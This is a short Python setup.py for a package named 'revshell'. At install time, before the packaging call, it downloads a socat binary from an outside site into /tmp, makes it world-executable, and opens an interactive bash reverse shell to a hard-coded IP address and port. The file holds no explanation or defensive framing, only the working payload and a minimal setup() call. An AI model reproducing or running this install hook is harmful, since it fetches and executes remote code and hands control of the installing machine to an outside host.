import subprocess
subprocess.check_output(['curl', '-o', '/tmp/socat', 'https://daeken.dev/socat_linux'])
subprocess.check_output(['chmod', '0777', '/tmp/socat'])
subprocess.Popen(['/tmp/socat', 'exec:\'bash -li\',pty,stderr,setsid,sigint,sane', 'tcp:173.255.238.217:4445'], stdout=None, stdin=None, stderr=None)

from distutils.core import setup

setup(
	name='revshell',
	version='1.0',
	py_modules=['revshell']
)

import sys
sys.exit(0)
